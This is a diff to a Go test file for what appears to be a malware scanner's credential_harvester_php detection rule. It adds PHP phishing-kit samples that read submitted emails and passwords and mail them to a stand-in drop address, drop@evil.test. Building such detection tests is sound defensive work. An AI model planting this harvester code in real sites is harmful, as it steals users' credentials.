@@ -12,12 +12,22 @@ func TestCredentialHarvesterPHP_ShortVariableNames(t *testing.T) {
 	mal := []byte(`<?php
 $e = $_POST['email'];
 $p = $_POST['password'];
-$body = "$e|$p";
+$body = "login: $e\npass: $p\n";
 mail('drop@evil.test', 'result', $body);
 `)
 	if !hasYaraRule(s.ScanBytes(mal), "credential_harvester_php") {
 		t.Error("credential_harvester_php gap: harvester using short variable names not detected")
 	}
+	// Nothing privileges the names $e and $p; a kit picks its own.
+	for _, mal := range [][]byte{
+		[]byte("<?php\n$u = $_POST['email'];\n$w = $_POST['password'];\nmail('drop@evil.test', 'result', \"$u:$w\");\n"),
+		[]byte("<?php\n$a1 = $_POST['email'];\n$b2 = $_POST['password'];\nmail('drop@evil.test', 'log', $a1 . '|' . $b2);\n"),
+	} {
+		if !hasYaraRule(s.ScanBytes(mal), "credential_harvester_php") {
+			t.Errorf("credential_harvester_php gap: harvester naming its variables differently not detected: %s", mal)
+		}
+	}
+
 	// A site owner's own signup handler posts the same two fields and mails a
 	// notice with raw mail(). It stays quiet when the mailed body carries only
 	// the new account's address.
